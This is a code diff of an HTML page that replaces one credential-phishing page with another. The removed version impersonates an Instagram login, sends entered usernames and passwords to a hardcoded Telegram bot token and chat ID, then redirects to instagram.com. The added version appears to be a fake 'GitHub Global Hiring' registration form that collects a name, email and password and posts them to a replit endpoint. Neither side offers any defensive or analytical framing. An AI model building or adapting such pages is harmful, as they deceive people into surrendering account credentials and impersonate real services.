@@ -1,67 +1,94 @@
-<!-- index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Instagram</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Register for GitHub Global Hiring</title>
   <style>
+    * { box-sizing: border-box; }
     body {
-      font-family: sans-serif;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.4);
+    }
+    h2 {
+      margin-top: 0;
       text-align: center;
-      padding: 50px;
+      color: #58a6ff;
     }
     input {
-      display: block;
-      margin: 10px auto;
+      width: 100%;
       padding: 10px;
-      width: 80%;
-      max-width: 300px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background: #0d1117;
+      color: white;
     }
     button {
-      padding: 10px 30px;
-      margin-top: 15px;
+      width: 100%;
+      padding: 12px;
+      background: #238636;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .message {
+      text-align: center;
+      margin-top: 20px;
+      color: #3fb950;
     }
   </style>
 </head>
 <body>
-  <h2>Instagram Login</h2>
-  <form id="loginForm">
-    <input type="text" id="username" placeholder="Phone number, username, or email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button type="submit">Log In</button>
-    <button type="button" onclick="handleSignup()">Sign Up</button>
-  </form>
+  <div class="container">
+    <h2>Register for GitHub Global Hiring</h2>
+    <form id="registerForm">
+      <input type="text" name="name" placeholder="Full Name" required />
+      <input type="email" name="email" placeholder="Email Address" required />
+      <input type="password" name="password" placeholder="Set Password" required />
+      <button type="submit">Register</button>
+    </form>
+    <div class="message" id="thankYou" style="display:none;">
+      ✅ Thank you! You’ll be contacted via email for the next round.
+    </div>
+  </div>
 
   <script>
-    const BOT_TOKEN = "7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U";
-    const CHAT_ID = "968143308";
+    const form = document.getElementById('registerForm');
+    const message = document.getElementById('thankYou');
 
-    function sendToTelegram(data) {
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: data
-        })
-      });
-    }
-
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
+    form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
-      sendToTelegram(`Login Attempt:\nUsername: ${user}\nPassword: ${pass}`);
-      window.location.href = "https://instagram.com"; // redirect after
-    });
 
-    function handleSignup() {
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
-      sendToTelegram(`Signup Attempt:\nUsername: ${user}\nPassword: ${pass}`);
-      window.location.href = "https://instagram.com/accounts/emailsignup/";
-    }
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
+
+      await fetch("https://your-replit-url.repl.co/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      form.style.display = "none";
+      message.style.display = "block";
+    });
   </script>
 </body>
 </html>
